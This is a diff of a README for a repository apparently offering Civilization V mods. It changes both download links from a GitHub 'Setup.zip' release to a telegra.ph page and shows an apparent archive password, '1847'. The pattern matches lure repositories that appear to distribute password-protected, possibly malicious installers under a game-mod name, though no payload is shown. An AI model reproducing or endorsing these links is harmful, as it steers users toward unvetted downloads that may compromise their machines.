@@ -8,7 +8,7 @@
 
 ---
 
-[![Download](og-image.png)](https://github.com/Sharpdruproduce/Civilization-V-Mods/releases/download/v1.0/Setup.zip)
+[![Download](og-image.png)](https://telegra.ph/Download-05-21-39)
 
 <img src="https://cdn.akamai.steamstatic.com/steam/apps/8930/header.jpg" alt="banner" width="100%" />
 
@@ -23,7 +23,7 @@
 
 ## 📥 Download
 
-[![Civilization V Mods](https://img.shields.io/badge/Download%20Civilization%20V%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/Sharpdruproduce/Civilization-V-Mods/releases/download/v1.0/Setup.zip)
+[![Civilization V Mods](https://img.shields.io/badge/Download%20Civilization%20V%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://telegra.ph/Download-05-21-39)
 
 **🔐🔐🔐** `1847`
 
